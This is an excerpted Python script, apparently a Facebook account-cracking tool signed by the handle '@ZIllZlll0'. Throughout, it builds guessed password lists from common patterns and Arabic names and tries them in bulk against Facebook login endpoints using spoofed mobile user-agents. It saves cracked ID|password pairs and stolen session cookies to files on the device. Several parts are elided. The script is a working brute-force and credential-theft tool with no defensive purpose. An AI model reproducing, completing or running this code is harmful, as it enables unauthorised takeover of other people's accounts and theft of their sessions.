import datetime;now = datetime.date.today();target = datetime.date(2024,12,28)
if now >=target:exit("@ZIllZlll0لا ضوج 💲 راسلني حتى افعلك @ZIllZlll0")
else:print("login")
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/@ZIllZlll0.txt \033[0;97m\n')
        #100010138361148
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                if ppp in ['1','01']:
                                    ...
                                    plist.append('19981998')
                                    plist.append('19901990')
                                    plist.append('عبود عبود')
                                    plist.append('طه محمد')
                                    plist.append('zzxxccvv')
                                    plist.append('محمد محمد')
                                    plist.append('حسن فلاح')
                                    plist.append('حيدر وليد')
                                    plist.append("786786")
                                    plist.append('00668899')
                                elif ppp in ["4","04"]:
                                    plist.append("firstlast")
                                    plist.append("first last")
                                    plist.append('محمد محمد')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;96@ZIllZlll0\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                print('\r\r\033[1;32m [@ZIllZlll0-OK] %s | %s'%(ids,pas))
                                dc=dict(session.cookies)
                                coki=";".join([k+"="+v for k,v in dc.items()])
                                open('/sdcard/@ZIllZlll0-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/@ZIllZlll0-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [@ZIllZlll0-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@ZIllZlll0-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [@ZIllZlll0] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                            ...
                            "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [@ZIllZlll0-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@ZIllZlll0-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/@ZIllZlll0CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [@ZIllZlll0-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/@ZIllZlll0-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/@ZIllZlll0_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [@ZIllZlll0] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/@ZIllZlll0-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
